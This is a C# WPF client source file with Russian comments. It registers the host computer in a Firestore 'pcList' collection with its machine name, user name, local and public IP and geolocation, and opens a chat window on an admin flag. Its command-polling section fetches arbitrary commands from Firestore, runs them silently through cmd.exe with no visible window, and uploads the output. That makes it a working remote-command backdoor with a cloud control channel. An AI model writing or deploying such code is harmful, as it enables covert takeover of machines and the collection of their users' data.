using Google.Cloud.Firestore;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows;
using Timer = System.Timers.Timer;

namespace ClientFirestore
{
    public partial class MainWindow : Window
    {
        // ====== Firestore ======
        private FirestoreDb Db => FirestoreProvider.Db;

        private string _pcKey;                 // "PC_PCNAME_USERNAME"
        private Timer _pingPollTimer;          // опрос ping
        private string _lastPingToken = "";

        private Timer _adminOpenPoll;          // опрос adminOpen
        private ChatWindow _chat;

        private Timer _cmdPollTimer;           // опрос команд
        private string _lastCmdId = "";

        // Таймер для проверки интернета при старте
        private Timer _internetCheckTimer;
        private bool _isInitialized = false;

        private DocumentReference PcDoc =>
            string.IsNullOrEmpty(_pcKey)
                ? null
                : Db.Collection("pcList").Document(_pcKey);

        private DocumentReference CmdDoc =>
            PcDoc?.Collection("command").Document("current");

        private const string IPINFO_TOKEN = ""; // если есть токен ipinfo.io



        public MainWindow()
        {
            InitializeComponent();

            Closing += Window_Closing;
            AppDomain.CurrentDomain.ProcessExit += OnProcessExit;

        }




        // ================= ПРОВЕРКА ИНТЕРНЕТА =================

        // Проверка наличия активного интернет-соединения
        private async Task<bool> CheckInternetConnectionAsync()
        {
            try
            {
                // Сначала проверяем сетевое подключение
                if (!NetworkInterface.GetIsNetworkAvailable())
                    return false;

                // Проверяем доступность Google DNS
                using (var ping = new Ping())
                {
                    var reply = await ping.SendPingAsync("8.8.8.8", 2000);
                    if (reply?.Status != IPStatus.Success)
                        return false;
                }

                // Дополнительная проверка через HTTP запрос
                using (var httpClient = new HttpClient())
                {
                    httpClient.Timeout = TimeSpan.FromSeconds(3);
                    var response = await httpClient.GetAsync("http://www.google.com/generate_204");
                    return response.IsSuccessStatusCode || response.StatusCode == HttpStatusCode.NoContent;
                }
            }
            catch
            {
                return false;
            }
        }

        // Ожидание появления интернета
        private async Task WaitForInternetAsync(CancellationToken cancellationToken = default)
        {
            while (!await CheckInternetConnectionAsync())
            {
                if (cancellationToken.IsCancellationRequested)
                    throw new TaskCanceledException();

                // Ждем 5 секунд перед следующей проверкой
                await Task.Delay(5000, cancellationToken);
            }
        }

        // ================= ОСНОВНОЙ ПРОЦЕСС ЗАГРУЗКИ =================











        private async void Window_Loaded(object sender, RoutedEventArgs e)
        {
            // Запускаем процесс инициализации в фоне
            _ = InitializeApplicationAsync();
        }


        private async Task InitializeApplicationAsync()
        {
            try
            {
                // Ждем появления интернета перед началом работы
                await Dispatcher.InvokeAsync(async () =>
                {
                });

                await WaitForInternetAsync();

                await Dispatcher.InvokeAsync(async () =>
                {
                });

                // Выполняем инициализацию с повторными попытками при потере соединения
                await ExecuteWithInternetRetryAsync(async () =>
                {
                    await RegisterAsync();
                    await SetOnlineAsync(true);
                });

                // Запускаем таймеры только после успешной инициализации
                await Dispatcher.InvokeAsync(() =>
                {
                    _isInitialized = true;

                    StartPingPoll();
                    StartCmdPoll();
                    StartAdminOpenWatcher();
                });
            }
            catch (Exception ex)
            {
                await Dispatcher.InvokeAsync(() =>
                {
                });
            }
        }


        // Обработчик для adminOpen с проверкой интернета
        private async void AdminOpenPollHandler(object sender, ElapsedEventArgs e)
        {
            if (PcDoc == null || !_isInitialized) return;

            // Пропускаем если нет интернета
            if (!await CheckInternetConnectionAsync())
                return;

            try
            {
                var snap = await PcDoc.GetSnapshotAsync();
                if (!snap.Exists) return;

                int adminOpen = snap.ContainsField("adminOpen")
                    ? snap.GetValue<int>("adminOpen")
                    : 0;

                bool adminWantsOpen = adminOpen == 1;

                Dispatcher.Invoke(() =>
                {
                    if (adminWantsOpen)
                    {
                        if (_chat == null || !_chat.IsVisible)
                        {
                            _chat = new ChatWindow(_pcKey, Environment.UserName, false);
                            _chat.Show();
                        }
                    }
                    else
                    {
                        if (_chat != null && _chat.IsVisible)
                            _chat.Close();
                    }
                });
            }
            catch (HttpRequestException)
            {
                // Игнорируем сетевые ошибки
            }
            catch (Exception)
            {
            }
        }
        // ================= ОБЕРТКА ДЛЯ ОПЕРАЦИЙ С ИНТЕРНЕТОМ =================

        private async Task ExecuteWithInternetRetryAsync(Func<Task> action, int maxRetries = 3)
        {
            int retryCount = 0;
            while (retryCount < maxRetries)
            {
                try
                {
                    if (!await CheckInternetConnectionAsync())
                    {
                        await WaitForInternetAsync();
                    }

                    await action();
                    return;
                }
                catch (Exception ex) when (IsNetworkException(ex))
                {
                    retryCount++;

                    if (retryCount >= maxRetries)
                        throw;

                    // Ждем перед повторной попыткой (экспоненциальная задержка)
                    int delay = 1000 * (int)Math.Pow(2, retryCount);
                    await Task.Delay(delay);
                }
            }
        }

        private bool IsNetworkException(Exception ex)
        {
            return ex is HttpRequestException ||
                   ex is TaskCanceledException ||
                   ex is PingException ||
                   ex is SocketException;
            
        }

        // ================= МОДИФИЦИРОВАННЫЕ МЕТОДЫ С ПРОВЕРКОЙ ИНТЕРНЕТА =================


        private async void Repeat_Click(object sender, RoutedEventArgs e)
        {
            await ExecuteWithInternetRetryAsync(async () =>
            {
                await RegisterAsync();
                await SetOnlineAsync(true);
            });
        }

        // ================= ВСПОМОГАТЕЛЬНЫЕ =================

        private static string NowLocal() => DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss");

        private static string EscapeJson(string s)
        {
            if (s == null) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"");
        }

        private static string GetLocalIp()
        {
            try
            {
                foreach (var ni in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (ni.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(ni))
                    {
                        var s = ni.ToString();
                        if (!s.StartsWith("169.254")) return s;
                    }
                }
            }
            catch { }
            return "";
        }

        // ====== IP info ======

        private class IpInfo
        {
            public string ip { get; set; }
            public string city { get; set; }
            public string region { get; set; }
            public string country { get; set; }
        }

        private static async Task<IpInfo> FetchIpInfoAsync(string token)
        {
            string url = "https://ipinfo.io/json";
            if (!string.IsNullOrEmpty(token)) url += "?token=" + token;

            using (var http = new HttpClient())
            {
                var json = await http.GetStringAsync(url);

                // System.Text.Json
                return System.Text.Json.JsonSerializer.Deserialize<IpInfo>(json);

            }
        }

        private static async Task<string> FallbackPublicIpAsync()
        {
            using (var http = new HttpClient())
            {
                try { return (await http.GetStringAsync("https://api.ipify.org")).Trim(); } catch { }
                try { return (await http.GetStringAsync("https://checkip.amazonaws.com")).Trim(); } catch { }
                try { return (await http.GetStringAsync("https://ifconfig.me/ip")).Trim(); } catch { }
            }
            throw new Exception("Не удалось определить внешний IP.");
        }

        // ================ РЕГИСТРАЦИЯ В Firestore ===================

        private async Task RegisterAsync()
        {
            try
            {
                // Проверяем интернет перед началом
                if (!await CheckInternetConnectionAsync())
                {
                    throw new HttpRequestException("Нет интернет-соединения");
                }

                string pcName = Environment.MachineName;
                string userName = Environment.UserName;
                string localIp = GetLocalIp();

                var ipinfo = await FetchIpInfoAsync(IPINFO_TOKEN) ?? new IpInfo();
                string internetIp = !string.IsNullOrEmpty(ipinfo.ip)
                    ? ipinfo.ip
                    : await FallbackPublicIpAsync();

                _pcKey = "PC_" + pcName.Replace(".", "_") + "_" + userName.Replace(".", "_");

                var systemMap = new
                {
                    pcName = pcName,
                    userName = userName,
                    localIp = localIp,
                    internetIp = internetIp,
                    country = ipinfo.country ?? "",
                    region = ipinfo.region ?? "",
                    city = ipinfo.city ?? ""
                };

                var onlineMap = new
                {
                    pcOnline = 1,
                    startTime = NowLocal()
                };

                await PcDoc.SetAsync(new
                {
                    system = systemMap,
                    online = onlineMap
                }, SetOptions.MergeAll);
            }
            catch (Exception ex)
            {
                // Перебрасываем исключение для обработки в ExecuteWithInternetRetryAsync
                throw;
            }
        }

        // ================ ONLINE/OFFLINE + PING ===================

        private async Task SetOnlineAsync(bool online)
        {
            if (PcDoc == null) return;

            // Проверяем интернет перед выполнением
            if (!await CheckInternetConnectionAsync())
            {
                throw new HttpRequestException("Нет интернет-соединения");
            }

            try
            {
                if (online)
                {
                    await PcDoc.UpdateAsync(new Dictionary<string, object>
                    {
                        ["online.pcOnline"] = 1,
                        ["online.startTime"] = NowLocal()
                    });
                }
                else
                {
                    await PcDoc.UpdateAsync(new Dictionary<string, object>
                    {
                        ["online.pcOnline"] = 0,
                        ["online.stopTime"] = NowLocal()
                    });
                }
            }
            catch (Exception ex)
            {
                throw;
            }
        }

        private void StartPingPoll()
        {
            _pingPollTimer?.Stop();
            _pingPollTimer?.Dispose();

            _pingPollTimer = new Timer(2000) { AutoReset = true };
            _pingPollTimer.Elapsed += async (_, __) => await PollPingAsync();
            _pingPollTimer.Start();
        }

        private async Task PollPingAsync()
        {
            if (PcDoc == null || !_isInitialized) return;

            // Пропускаем если нет интернета
            if (!await CheckInternetConnectionAsync())
                return;

            try
            {
                var snap = await PcDoc.GetSnapshotAsync();
                if (!snap.Exists || !snap.ContainsField("online.ping")) return;

                var token = snap.GetValue<string>("online.ping") ?? "";
                if (string.IsNullOrEmpty(token) || token == _lastPingToken) return;

                // отвечаем pong
                await PcDoc.UpdateAsync("online.pong", token);
                _lastPingToken = token;
            }
            catch (HttpRequestException)
            {
                // Игнорируем сетевые ошибки в таймере
            }
            catch (Exception)
            {
                // Другие ошибки логируем, но не прерываем таймер
            }
        }

        // =================== WATCH AdminOpen (открыть чат) =================

        private void StartAdminOpenWatcher()
        {
            _adminOpenPoll?.Stop();
            _adminOpenPoll?.Dispose();

            _adminOpenPoll = new Timer(1000) { AutoReset = true };
            _adminOpenPoll.Elapsed += async (_, __) =>
            {
                if (PcDoc == null) return;

                try
                {
                    var snap = await PcDoc.GetSnapshotAsync();
                    if (!snap.Exists) return;

                    int adminOpen = snap.ContainsField("adminOpen")
                        ? snap.GetValue<int>("adminOpen")
                        : 0;

                    bool adminWantsOpen = adminOpen == 1;

                    Dispatcher.Invoke(() =>
                    {
                        if (adminWantsOpen)
                        {
                            if (_chat == null || !_chat.IsVisible)
                            {
                                _chat = new ChatWindow(_pcKey, Environment.UserName, false);
                                _chat.Show();
                            }
                        }
                        else
                        {
                            if (_chat != null && _chat.IsVisible)
                                _chat.Close();
                        }
                    });
                }
                catch
                {
                }
            };
            _adminOpenPoll.Start();
        }

        // =================== КОМАНДЫ CMD =======================

        private void StartCmdPoll()
        {
            _cmdPollTimer?.Stop();
            _cmdPollTimer?.Dispose();

            _cmdPollTimer = new Timer(1500) { AutoReset = true };
            _cmdPollTimer.Elapsed += async (_, __) => await PollCommandAsync();
            _cmdPollTimer.Start();
        }

        private static async Task<(int exitCode, string stdout, string stderr)> RunCommandAsync(string cmd)
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c chcp 65001>nul & " + cmd,
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding = Encoding.UTF8
            };

            using (var p = System.Diagnostics.Process.Start(psi))
            {
                string stdout = await p.StandardOutput.ReadToEndAsync();
                string stderr = await p.StandardError.ReadToEndAsync();
                await Task.Run(() => p.WaitForExit());
                return (p.ExitCode, stdout, stderr);
            }
        }

        private static string Trunc(string s, int max)
        {
            if (string.IsNullOrEmpty(s)) return "";
            if (s.Length <= max) return s;
            return s.Substring(0, max) + "\n... [truncated]";
        }

        private async Task PollCommandAsync()
        {
            if (CmdDoc == null || !_isInitialized) return;

            // Пропускаем если нет интернета
            if (!await CheckInternetConnectionAsync())
                return;

            try
            {
                var snap = await CmdDoc.GetSnapshotAsync();
                if (!snap.Exists) return;

                var data = snap.ToDictionary() ?? new Dictionary<string, object>();

                string id = data.ContainsKey("id") ? Convert.ToString(data["id"]) : "";
                string cmdText = data.ContainsKey("cmd") ? Convert.ToString(data["cmd"]) : "";
                string status = data.ContainsKey("status") ? Convert.ToString(data["status"]) : "new";

                if (string.IsNullOrWhiteSpace(id) || string.IsNullOrWhiteSpace(cmdText)) return;
                if (status != "new") return;
                if (id == _lastCmdId) return;

                _lastCmdId = id;

                // помечаем как running
                await CmdDoc.UpdateAsync(new Dictionary<string, object>
                {
                    ["status"] = "running",
                    ["worker"] = _pcKey
                });

                int exitCode = -1;
                string stdout = "", stderr = "";
                try
                {
                    var r = await RunCommandAsync(cmdText);
                    exitCode = r.exitCode;
                    stdout = r.stdout;
                    stderr = r.stderr;
                }
                catch (Exception ex)
                {
                    stderr = ex.Message;
                }

                var outSafe = Trunc(stdout, 60000);
                var errSafe = Trunc(stderr, 60000);

                // Отправляем результат (с проверкой интернета)
                if (await CheckInternetConnectionAsync())
                {
                    await CmdDoc.UpdateAsync(new Dictionary<string, object>
                    {
                        ["status"] = "done",
                        ["exitCode"] = exitCode,
                        ["stdout"] = outSafe,
                        ["stderr"] = errSafe,
                        ["cmd"] = cmdText,
                        ["id"] = id,
                        ["worker"] = _pcKey
                    });
                }
            }
            catch (HttpRequestException)
            {
                // Игнорируем сетевые ошибки
            }
            catch (Exception)
            {
            }
        }

        // =================== ЗАКРЫТИЕ =======================

        private async void Window_Closing(object sender, CancelEventArgs e)
        {
            try
            {
                _pingPollTimer?.Stop();
                _pingPollTimer?.Dispose();

                _cmdPollTimer?.Stop();
                _cmdPollTimer?.Dispose();

                _adminOpenPoll?.Stop();
                _adminOpenPoll?.Dispose();

                await SetOnlineAsync(false);
            }
            catch
            {
            }
        }

        private async void OnProcessExit(object sender, EventArgs e)
        {
            try
            {
                await SetOnlineAsync(false);
            }
            catch
            {
            }
        }
    }
}
